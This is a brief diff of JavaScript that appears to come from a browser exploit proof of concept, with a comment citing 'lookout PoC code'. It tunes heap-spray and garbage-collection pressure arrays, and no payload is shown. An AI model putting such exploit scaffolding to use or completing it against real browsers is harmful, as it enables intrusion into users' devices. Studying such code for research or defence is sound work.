@@ -3,7 +3,7 @@
 // and lookout PoC code.
 
 
- var bufs = new Array(1000);
+ var bufs = new Array(100);
  var stale = 0;
 
 
@@ -59,7 +59,7 @@ function d2u(d)
 }
 
 // dgc attempts to trigger a garbage collection by allocating a large amount of memory
-var pressure = new Array(100);
+var pressure = new Array(100 * 2);
 dgc = function() {
  	for (var i = 0; i < pressure.length; i++) {
  		pressure[i] = new Uint32Array(0x10000);
